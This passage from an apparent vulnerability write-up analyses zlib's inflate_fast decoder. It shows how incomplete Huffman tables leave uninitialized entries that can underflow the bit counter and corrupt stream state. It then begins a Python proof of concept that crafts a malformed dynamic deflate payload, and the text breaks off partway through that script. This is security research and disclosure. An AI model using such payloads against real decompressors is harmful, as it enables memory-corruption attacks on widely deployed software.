        <span>}</span>
        <span>else</span> <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                     <span>/* length base */</span>
            len <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
            op <span>&amp;=</span> <span>15</span><span>;</span>                           <span>/* number of extra bits */</span>
            <span>if</span> <span>(</span>op<span>)</span> <span>{</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                <span>}</span>
                len <span>+=</span> <span>(</span><span>unsigned</span><span>)</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>;</span>
                hold <span>&gt;&gt;=</span> op<span>;</span>
                bits <span>-=</span> op<span>;</span>
            <span>}</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         length %u\n&#34;</span><span>,</span> len<span>)</span><span>)</span><span>;</span>
            <span>if</span> <span>(</span>bits <span>&lt;</span> <span>15</span><span>)</span> <span>{</span>
                hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                bits <span>+=</span> <span>8</span><span>;</span>
                hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                bits <span>+=</span> <span>8</span><span>;</span>
            <span>}</span></code></pre>
<p>The logic mirrors <code>inflate.c</code>: look up a <code>code</code> in <code>lcode</code>. If it’s a literal, emit it and continue; if it’s a length, decode the length and then decode the distance next, preloading more bits first.</p>
<pre><code>            here <span>=</span> dcode <span>+</span> <span>(</span>hold <span>&amp;</span> dmask<span>)</span><span>;</span>
          dodist<span>:</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
            hold <span>&gt;&gt;=</span> op<span>;</span>
            bits <span>-=</span> op<span>;</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>op<span>)</span><span>;</span>
            <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                      <span>/* distance base */</span>
                dist <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
                op <span>&amp;=</span> <span>15</span><span>;</span>                       <span>/* number of extra bits */</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                    <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                        hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                        bits <span>+=</span> <span>8</span><span>;</span>
                    <span>}</span>
                <span>}</span>
                dist <span>+=</span> <span>(</span><span>unsigned</span><span>)</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>;</span>
<span>#<span>ifdef</span> INFLATE_STRICT</span>
                <span>if</span> <span>(</span>dist <span>&gt;</span> dmax<span>)</span> <span>{</span>
                    strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid distance too far back&#34;</span><span>;</span>
                    state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                    <span>break</span><span>;</span>
                <span>}</span>
<span>#<span>endif</span></span>
                hold <span>&gt;&gt;=</span> op<span>;</span>
                bits <span>-=</span> op<span>;</span>
                <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         distance %u\n&#34;</span><span>,</span> dist<span>)</span><span>)</span><span>;</span></code></pre>
<p>Distance decoding follows. After that, the LZ77 copy routine (not shown here) copies bytes from the window; the code is messy because it optimizes for various cases.</p>
<pre><code>            <span>else</span> <span>if</span> <span>(</span><span>(</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>          <span>/* 2nd level distance code */</span>
                here <span>=</span> dcode <span>+</span> here<span>-&gt;</span>val <span>+</span> <span>(</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>)</span><span>;</span>
                <span>goto</span> dodist<span>;</span>
            <span>}</span>
            <span>else</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid distance code&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
        <span>}</span>
        <span>else</span> <span>if</span> <span>(</span><span>(</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>              <span>/* 2nd level length code */</span>
            here <span>=</span> lcode <span>+</span> here<span>-&gt;</span>val <span>+</span> <span>(</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>)</span><span>;</span>
            <span>goto</span> dolen<span>;</span>
        <span>}</span>
        <span>else</span> <span>if</span> <span>(</span>op <span>&amp;</span> <span>32</span><span>)</span> <span>{</span>                     <span>/* end-of-block */</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> <span>&#34;inflate:         end of block\n&#34;</span><span>)</span><span>)</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> TYPE<span>;</span>
            <span>break</span><span>;</span>
        <span>}</span>
        <span>else</span> <span>{</span>
            strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid literal/length code&#34;</span><span>;</span>
            state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
            <span>break</span><span>;</span>
        <span>}</span></code></pre>
<p>After the LZ77 copy, the code handles second-level table lookups and invalid codes.</p>

<hr/>
<p>We analyzed the principal parts of <code>Inflate</code>, the decoder for <code>Deflate</code>. Do you see the bug? Everything looks well designed.</p>
<h2 id="4-1-unintialized-huffman-code-table">4-1. Unintialized Huffman Code Table</h2>
<p>There’s a subtle issue in the Huffman table construction. A Huffman table can be incomplete. For example, if <code>root</code> is 8 and the maximum code length is 10, there will be no entries for length‑9 codes; i.e., some table entries remain unset. Are such NULL entries handled correctly during decoding?</p>
<pre><code><span>// inflate.c</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid literal/length code&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>
<span>.</span><span>.</span><span>.</span>
            <span>if</span> <span>(</span>here<span>.</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>{</span>
                strm<span>-&gt;</span>msg <span>=</span> <span>(</span>z_const <span>char</span> <span>*</span><span>)</span><span>&#34;invalid distance code&#34;</span><span>;</span>
                state<span>-&gt;</span>mode <span>=</span> BAD<span>;</span>
                <span>break</span><span>;</span>
            <span>}</span>

<span>// inftrees.c</span>
    <span>if</span> <span>(</span>huff <span>!=</span> <span>0</span><span>)</span> <span>{</span>
        here<span>.</span>op <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>64</span><span>;</span>            <span>/* invalid code marker */</span>
        here<span>.</span>bits <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>len <span>-</span> drop<span>)</span><span>;</span>
        here<span>.</span>val <span>=</span> <span>(</span><span>unsigned</span> <span>short</span><span>)</span><span>0</span><span>;</span>
        next<span>[</span>huff<span>]</span> <span>=</span> here<span>;</span>
    <span>}</span></code></pre>
<p>No. As we’ve seen, incomplete entries should be filled with <code>op=64</code> (invalid).</p>
<p>As a result, any NULL entries get treated as if they were <code>code</code> structures with <code>op=0, bits=0, val=0</code>. Or, <strong>they may retain stale values from a previous block</strong>.</p>
<h2 id="4-2-exploiting-inflate_fast">4-2. Exploiting inflate_fast</h2>
<p>To achieve high speed, <code>inflate_fast</code> omits many checks; it can therefore cause memory corruption when encountering incomplete Huffman tables. Let’s explore how.</p>
<p>The first memory bug identified was an integer overflow, but it wasn’t exploitable. The second was a stream overflow, which we ultimately exploited. We’ll describe both.</p>
<h3 id="4-2-1-integer-overflow-unexploitable">4-2-1. Integer Overflow (Unexploitable)</h3>
<p>Let’s see what happens when a zero‑initialized table entry (<code>op=0, bits=0, val=0</code>) is used in decoding.</p>
<pre><code>      dolen<span>:</span>
        op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
        hold <span>&gt;&gt;=</span> op<span>;</span>
        bits <span>-=</span> op<span>;</span>
        op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>op<span>)</span><span>;</span>
        <span>if</span> <span>(</span>op <span>==</span> <span>0</span><span>)</span> <span>{</span>                          <span>/* literal */</span>
            <span>Tracevv</span><span>(</span><span>(</span><span>stderr</span><span>,</span> here<span>-&gt;</span>val <span>&gt;=</span> <span>0x20</span> <span>&amp;&amp;</span> here<span>-&gt;</span>val <span>&lt;</span> <span>0x7f</span> <span>?</span>
                    <span>&#34;inflate:         literal &#39;%c&#39;\n&#34;</span> <span>:</span>
                    <span>&#34;inflate:         literal 0x%02x\n&#34;</span><span>,</span> here<span>-&gt;</span>val<span>)</span><span>)</span><span>;</span>
            <span>*</span>out<span>++</span> <span>=</span> <span>(</span><span>unsigned</span> <span>char</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
        <span>}</span></code></pre>
<p>In the literal path, a <code>code</code> with <code>op=0, bits=0, val=0</code> consumes zero bits and decodes a null byte. Since no bits are consumed, <code>inflate_fast</code> would loop forever decoding that same entry.</p>
<pre><code>    <span>}</span> <span>while</span> <span>(</span>in <span>&lt;</span> last <span>&amp;&amp;</span> out <span>&lt;</span> end<span>)</span><span>;</span></code></pre>
<p>However, the loop is bounded by <code>out &lt; end</code>, so no overflow occurs here.</p>
<pre><code>      dolen<span>:</span>
        op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
        hold <span>&gt;&gt;=</span> op<span>;</span>
        bits <span>-=</span> op<span>;</span>
        <span>.</span><span>.</span><span>.</span>
        <span>else</span> <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                     <span>/* length base */</span>
            len <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
            op <span>&amp;=</span> <span>15</span><span>;</span>                           <span>/* number of extra bits */</span>
            <span>if</span> <span>(</span>op<span>)</span> <span>{</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                <span>}</span>
                len <span>+=</span> <span>(</span><span>unsigned</span><span>)</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>;</span>
                hold <span>&gt;&gt;=</span> op<span>;</span>
                bits <span>-=</span> op<span>;</span>
            <span>}</span>
            <span>.</span><span>.</span><span>.</span>
        <span>else</span> <span>if</span> <span>(</span><span>(</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>              <span>/* 2nd level length code */</span>
            here <span>=</span> lcode <span>+</span> here<span>-&gt;</span>val <span>+</span> <span>(</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>)</span><span>;</span>
            <span>goto</span> dolen<span>;</span>
        <span>}</span></code></pre>
<p>What about the length path? Because of the <code>op</code> checks, the code falls into the second-level table lookup. With zero bits consumed, it indexes the 0th entry again.</p>
<pre><code>          dodist<span>:</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>bits<span>)</span><span>;</span>
            hold <span>&gt;&gt;=</span> op<span>;</span>
            bits <span>-=</span> op<span>;</span>
            op <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>op<span>)</span><span>;</span>
            <span>if</span> <span>(</span>op <span>&amp;</span> <span>16</span><span>)</span> <span>{</span>                      <span>/* distance base */</span>
                dist <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>here<span>-&gt;</span>val<span>)</span><span>;</span>
                op <span>&amp;=</span> <span>15</span><span>;</span>                       <span>/* number of extra bits */</span>
                <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                    hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                    bits <span>+=</span> <span>8</span><span>;</span>
                    <span>if</span> <span>(</span>bits <span>&lt;</span> op<span>)</span> <span>{</span>
                        hold <span>+=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>(</span><span>*</span>in<span>++</span><span>)</span> <span>&lt;&lt;</span> bits<span>;</span>
                        bits <span>+=</span> <span>8</span><span>;</span>
                    <span>}</span>
                <span>}</span>
            <span>.</span><span>.</span><span>.</span><span>.</span>
            <span>else</span> <span>if</span> <span>(</span><span>(</span>op <span>&amp;</span> <span>64</span><span>)</span> <span>==</span> <span>0</span><span>)</span> <span>{</span>          <span>/* 2nd level distance code */</span>
                here <span>=</span> dcode <span>+</span> here<span>-&gt;</span>val <span>+</span> <span>(</span>hold <span>&amp;</span> <span>(</span><span>(</span><span>1U</span> <span>&lt;&lt;</span> op<span>)</span> <span>-</span> <span>1</span><span>)</span><span>)</span><span>;</span>
                <span>goto</span> dodist<span>;</span>
            <span>}</span></code></pre>
<p>Distance decoding behaves similarly, but worse: the second-level lookup jumps <em>back into</em> the distance decode path. The “0th table entry” behavior is dangerous, because the second-level lookup is designed to read a sub-table (with smaller <code>bits</code>), but instead it’s indexing the <strong>primary</strong> table. <code>inflate_fast</code> keeps at least 16 bits in <code>hold</code> and assumes no codes exceed 15 bits, so it omits checks. The erroneous “0th entry” lookup breaks this assumption.</p>
<blockquote>
<p>Why are Huffman codes guaranteed ≤15 bits? Because the Code Huffman table itself can only encode lengths up to 15; longer lengths cannot be represented.</p>
</blockquote>
<p>Consider:</p>
<pre><code>Bit buffer size: 16 (minimum present)
Primary table root: 10
Maximum Huffman code length: 12

1. Normal second-level distance lookup -&gt; uninitialized entry `op=0, bits=0, val=0` (bits: 16 - 10 = 6)
2. Abnormal second-level lookup -&gt; 0th primary-table entry (bits: 6 - 0 = 6)
3. Decoding the 0th primary-table entry (bits: 6 - 10 = -2)</code></pre>
<p>As noted, the distance path jumps back into distance decoding after the second-level lookup, so the primary table (not sub-table) is indexed next, consuming too many bits. Ultimately, the <code>bits</code> counter underflows—an integer overflow.</p>
<pre><code>    <span>/* return unused bytes (on entry, bits &lt; 8, so in won&#39;t go too far back) */</span>
    len <span>=</span> bits <span>&gt;&gt;</span> <span>3</span><span>;</span>
    in <span>-=</span> len<span>;</span>
    bits <span>-=</span> len <span>&lt;&lt;</span> <span>3</span><span>;</span>
    hold <span>&amp;=</span> <span>(</span><span>1U</span> <span>&lt;&lt;</span> bits<span>)</span> <span>-</span> <span>1</span><span>;</span>

    <span>/* update state and return */</span>
    strm<span>-&gt;</span>next_in <span>=</span> in<span>;</span>
    strm<span>-&gt;</span>next_out <span>=</span> out<span>;</span>
    strm<span>-&gt;</span>avail_in <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>in <span>&lt;</span> last <span>?</span> <span>5</span> <span>+</span> <span>(</span>last <span>-</span> in<span>)</span> <span>:</span> <span>5</span> <span>-</span> <span>(</span>in <span>-</span> last<span>)</span><span>)</span><span>;</span>
    strm<span>-&gt;</span>avail_out <span>=</span> <span>(</span><span>unsigned</span><span>)</span><span>(</span>out <span>&lt;</span> end <span>?</span>
                                 <span>257</span> <span>+</span> <span>(</span>end <span>-</span> out<span>)</span> <span>:</span> <span>257</span> <span>-</span> <span>(</span>out <span>-</span> end<span>)</span><span>)</span><span>;</span>
    state<span>-&gt;</span>hold <span>=</span> hold<span>;</span>
    state<span>-&gt;</span>bits <span>=</span> bits<span>;</span>
    <span>return</span><span>;</span></code></pre>
<p>At the end of <code>inflate_fast</code>, the code adjusts <code>in</code>/<code>avail_in</code> by the number of unused bits. Thus, the integer overflow in <code>bits</code> corrupts <code>strm-&gt;next_in</code> and <code>strm-&gt;avail_in</code>, affecting subsequent decoding.</p>
<h3 id="4-2-2-poc">4-2-2. PoC</h3>
<pre><code><span>import</span> struct

<span>class</span> <span>BitStream</span><span>:</span>
    <span>&#34;&#34;&#34;LSB-first bit stream writer.&#34;&#34;&#34;</span>
    <span>def</span> <span>__init__</span><span>(</span>self<span>)</span><span>:</span>
        self<span>.</span>bits <span>=</span> <span>0</span>
        self<span>.</span>bit_count <span>=</span> <span>0</span>
        self<span>.</span>data <span>=</span> <span>bytearray</span><span>(</span><span>)</span>

    <span>def</span> <span>write_bits</span><span>(</span>self<span>,</span> value<span>,</span> num_bits<span>)</span><span>:</span>
        <span>for</span> i <span>in</span> <span>range</span><span>(</span>num_bits<span>)</span><span>:</span>
            bit <span>=</span> <span>(</span>value <span>&gt;&gt;</span> i<span>)</span> <span>&amp;</span> <span>1</span>
            <span>if</span> bit<span>:</span>
                self<span>.</span>bits <span>|</span><span>=</span> <span>(</span><span>1</span> <span>&lt;&lt;</span> self<span>.</span>bit_count<span>)</span>
            self<span>.</span>bit_count <span>+=</span> <span>1</span>
            <span>if</span> self<span>.</span>bit_count <span>==</span> <span>8</span><span>:</span>
                self<span>.</span>data<span>.</span>append<span>(</span>self<span>.</span>bits<span>)</span>
                self<span>.</span>bits <span>=</span> <span>0</span>
                self<span>.</span>bit_count <span>=</span> <span>0</span>

    <span>def</span> <span>get_bytes</span><span>(</span>self<span>)</span><span>:</span>
        <span>if</span> self<span>.</span>bit_count <span>&gt;</span> <span>0</span><span>:</span>
            self<span>.</span>data<span>.</span>append<span>(</span>self<span>.</span>bits<span>)</span>
        <span>return</span> self<span>.</span>data

<span>def</span> <span>generate_huffman_codes_from_lengths</span><span>(</span>lengths<span>)</span><span>:</span>
    max_len <span>=</span> <span>0</span>
    <span>for</span> length <span>in</span> lengths<span>:</span>
        <span>if</span> length <span>&gt;</span> max_len<span>:</span>
            max_len <span>=</span> length
    
    <span>if</span> max_len <span>==</span> <span>0</span><span>:</span>
        <span>return</span> <span>{</span><span>}</span>

    bl_count <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>(</span>max_len <span>+</span> <span>1</span><span>)</span>
    <span>for</span> length <span>in</span> lengths<span>:</span>
        <span>if</span> length <span>&gt;</span> <span>0</span><span>:</span>
            bl_count<span>[</span>length<span>]</span> <span>+=</span> <span>1</span>
    
    code <span>=</span> <span>0</span>
    next_code <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>(</span>max_len <span>+</span> <span>1</span><span>)</span>
    <span>for</span> bits_len <span>in</span> <span>range</span><span>(</span><span>1</span><span>,</span> max_len <span>+</span> <span>1</span><span>)</span><span>:</span>
        code <span>=</span> <span>(</span>code <span>+</span> bl_count<span>[</span>bits_len <span>-</span> <span>1</span><span>]</span><span>)</span> <span>&lt;&lt;</span> <span>1</span>
        next_code<span>[</span>bits_len<span>]</span> <span>=</span> code

    huffman_codes <span>=</span> <span>{</span><span>}</span>
    <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>lengths<span>)</span><span>:</span>
        <span>if</span> length <span>!=</span> <span>0</span><span>:</span>
            rev_code <span>=</span> <span>int</span><span>(</span><span><span>f&#39;</span><span><span>{</span>next_code<span>[</span>length<span>]</span><span>:</span><span>0</span><span>{</span>length<span>}</span>b<span>}</span></span><span>&#39;</span></span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span> <span>2</span><span>)</span>
            huffman_codes<span>[</span>i<span>]</span> <span>=</span> <span>(</span>rev_code<span>,</span> length<span>)</span>
            next_code<span>[</span>length<span>]</span> <span>+=</span> <span>1</span>
    
    <span>return</span> huffman_codes

lbase <span>=</span> <span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>13</span><span>,</span> <span>15</span><span>,</span> <span>17</span><span>,</span> <span>19</span><span>,</span> <span>23</span><span>,</span> <span>27</span><span>,</span> <span>31</span><span>,</span> <span>35</span><span>,</span> <span>43</span><span>,</span> <span>51</span><span>,</span> <span>59</span><span>,</span> <span>67</span><span>,</span> <span>83</span><span>,</span> <span>99</span><span>,</span> <span>115</span><span>,</span> <span>131</span><span>,</span> <span>163</span><span>,</span> <span>195</span><span>,</span> <span>227</span><span>,</span> <span>258</span><span>]</span>
lext <span>=</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>0</span><span>]</span>
dbase <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>13</span><span>,</span> <span>17</span><span>,</span> <span>25</span><span>,</span> <span>33</span><span>,</span> <span>49</span><span>,</span> <span>65</span><span>,</span> <span>97</span><span>,</span> <span>129</span><span>,</span> <span>193</span><span>,</span> <span>257</span><span>,</span> <span>385</span><span>,</span> <span>513</span><span>,</span> <span>769</span><span>,</span> <span>1025</span><span>,</span> <span>1537</span><span>,</span> <span>2049</span><span>,</span> <span>3073</span><span>,</span> <span>4097</span><span>,</span> <span>6145</span><span>,</span> <span>8193</span><span>,</span> <span>12289</span><span>,</span> <span>16385</span><span>,</span> <span>24577</span><span>]</span>
dext <span>=</span> <span>[</span><span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>0</span><span>,</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>,</span> <span>5</span><span>,</span> <span>6</span><span>,</span> <span>6</span><span>,</span> <span>7</span><span>,</span> <span>7</span><span>,</span> <span>8</span><span>,</span> <span>8</span><span>,</span> <span>9</span><span>,</span> <span>9</span><span>,</span> <span>10</span><span>,</span> <span>10</span><span>,</span> <span>11</span><span>,</span> <span>11</span><span>,</span> <span>12</span><span>,</span> <span>12</span><span>,</span> <span>13</span><span>,</span> <span>13</span><span>]</span>
order <span>=</span> <span>[</span><span>16</span><span>,</span> <span>17</span><span>,</span> <span>18</span><span>,</span> <span>0</span><span>,</span> <span>8</span><span>,</span> <span>7</span><span>,</span> <span>9</span><span>,</span> <span>6</span><span>,</span> <span>10</span><span>,</span> <span>5</span><span>,</span> <span>11</span><span>,</span> <span>4</span><span>,</span> <span>12</span><span>,</span> <span>3</span><span>,</span> <span>13</span><span>,</span> <span>2</span><span>,</span> <span>14</span><span>,</span> <span>1</span><span>,</span> <span>15</span><span>]</span>

<span>def</span> <span>find_len_sym</span><span>(</span>length<span>)</span><span>:</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>len</span><span>(</span>lbase<span>)</span><span>)</span><span>:</span>
        <span>if</span> lbase<span>[</span>i<span>]</span> <span>&gt;</span> length<span>:</span>
            i <span>-=</span> <span>1</span>
            <span>break</span>
    base_len <span>=</span> lbase<span>[</span>i<span>]</span>
    extra_bits <span>=</span> lext<span>[</span>i<span>]</span>
    extra_val <span>=</span> length <span>-</span> base_len
    <span>return</span> <span>257</span> <span>+</span> i<span>,</span> extra_bits<span>,</span> extra_val

<span>def</span> <span>find_dist_sym</span><span>(</span>distance<span>)</span><span>:</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>len</span><span>(</span>dbase<span>)</span><span>)</span><span>:</span>
        <span>if</span> dbase<span>[</span>i<span>]</span> <span>&gt;</span> distance<span>:</span>
            i <span>-=</span> <span>1</span>
            <span>break</span>
    base_dist <span>=</span> dbase<span>[</span>i<span>]</span>
    extra_bits <span>=</span> dext<span>[</span>i<span>]</span>
    extra_val <span>=</span> distance <span>-</span> base_dist
    <span>return</span> i<span>,</span> extra_bits<span>,</span> extra_val

<span>def</span> <span>encode_lengths_rle</span><span>(</span>lengths<span>)</span><span>:</span>
    encoded <span>=</span> <span>[</span><span>]</span>
    i <span>=</span> <span>0</span>
    <span>while</span> i <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span><span>:</span>
        current_len <span>=</span> lengths<span>[</span>i<span>]</span>
        
        <span>if</span> current_len <span>==</span> <span>0</span><span>:</span>
            count <span>=</span> <span>0</span>
            <span>while</span> i <span>+</span> count <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span> <span>and</span> lengths<span>[</span>i <span>+</span> count<span>]</span> <span>==</span> <span>0</span> <span>and</span> count <span>&lt;</span> <span>138</span><span>:</span>
                count <span>+=</span> <span>1</span>
            <span>if</span> count <span>&gt;=</span> <span>11</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>18</span><span>,</span> count <span>-</span> <span>11</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>
            <span>if</span> count <span>&gt;=</span> <span>3</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>17</span><span>,</span> count <span>-</span> <span>3</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>

        <span>if</span> i <span>&gt;</span> <span>0</span> <span>and</span> current_len <span>==</span> lengths<span>[</span>i <span>-</span> <span>1</span><span>]</span><span>:</span>
            count <span>=</span> <span>0</span>
            <span>while</span> i <span>+</span> count <span>&lt;</span> <span>len</span><span>(</span>lengths<span>)</span> <span>and</span> lengths<span>[</span>i <span>+</span> count<span>]</span> <span>==</span> current_len <span>and</span> count <span>&lt;</span> <span>6</span><span>:</span>
                count <span>+=</span> <span>1</span>
            <span>if</span> count <span>&gt;=</span> <span>3</span><span>:</span>
                encoded<span>.</span>append<span>(</span><span>(</span><span>16</span><span>,</span> count <span>-</span> <span>3</span><span>)</span><span>)</span>
                i <span>+=</span> count
                <span>continue</span>

        encoded<span>.</span>append<span>(</span><span>(</span>current_len<span>,</span> <span>None</span><span>)</span><span>)</span>
        i <span>+=</span> <span>1</span>
    <span>return</span> encoded

<span>def</span> <span>create_dynamic_deflate_payload</span><span>(</span>stream<span>,</span> is_last<span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span><span>:</span>
    
    nlen <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>ll_lengths<span>)</span> <span>if</span> length <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>
    ndist <span>=</span> <span>max</span><span>(</span>i <span>for</span> i<span>,</span> length <span>in</span> <span>enumerate</span><span>(</span>dist_lengths<span>)</span> <span>if</span> length <span>&gt;</span> <span>0</span><span>)</span> <span>+</span> <span>1</span>
    
    all_lengths <span>=</span> ll_lengths<span>[</span><span>:</span>nlen<span>]</span> <span>+</span> dist_lengths<span>[</span><span>:</span>ndist<span>]</span>
    rle_encoded_lengths <span>=</span> encode_lengths_rle<span>(</span>all_lengths<span>)</span>
    
    rle_symbols <span>=</span> <span>[</span>item<span>[</span><span>0</span><span>]</span> <span>for</span> item <span>in</span> rle_encoded_lengths<span>]</span>
